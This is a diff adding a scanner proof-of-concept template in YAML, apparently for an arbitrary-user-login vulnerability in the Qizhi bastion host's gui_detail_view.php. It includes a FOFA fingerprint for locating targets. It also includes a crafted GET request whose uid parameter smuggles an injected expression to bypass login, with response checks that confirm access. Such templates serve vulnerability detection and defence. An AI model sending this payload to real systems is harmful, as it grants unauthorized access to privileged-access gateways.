@@ -1,0 +1,23 @@
+id: poc-yaml-qizhi-jump-server-gui-detail-view-php-any-user-login
+info:
+  name: 齐治堡垒机 gui_detail_view.php 任意用户登录漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 未授权访问
+  finger: 齐治堡垒机
+  fofa: app="齐治科技-堡垒机"
+requests:
+- method: GET
+  path: /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
+  expression: 'status_code == 200
+
+    && contains(body,"错误的id")
+
+    && contains(body,"事件审计")
+
+    && contains(body,"审计管理员")
+
+    '
+variables: {}
+transport: http
